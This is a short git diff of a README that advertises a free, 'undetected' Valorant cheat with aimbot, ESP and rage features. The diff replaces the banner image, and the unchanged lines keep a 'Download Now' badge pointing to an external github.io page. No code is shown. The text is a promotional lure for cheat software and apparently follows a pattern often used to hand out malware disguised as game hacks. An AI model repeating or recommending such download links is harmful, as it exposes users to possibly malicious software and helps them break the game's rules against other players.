@@ -1,6 +1,7 @@
 # 🚀 Valorant Hack 2026 | Aim + ESP + Rage | Undetected & Free
 
-![Valorant Hack 2026 Banner](https://via.placeholder.com/1200x400/0d1117/ff4655?text=Valorant+Hack+2026+-+Undetected+Cheat)
+![Valorant Hack 2026 Banner](https://github.com/user-attachments/assets/e9707823-7274-4000-99ac-afddd5d6c825)
+
 
 [![Download Now](https://img.shields.io/badge/Download-Valorant_Hack_2026-brightgreen?style=for-the-badge&logo=github)](https://circlefiscalmarina.github.io/Valo-HacksExternal/)
 ![Version](https://img.shields.io/badge/Version-2.0.6-blue?style=for-the-badge)
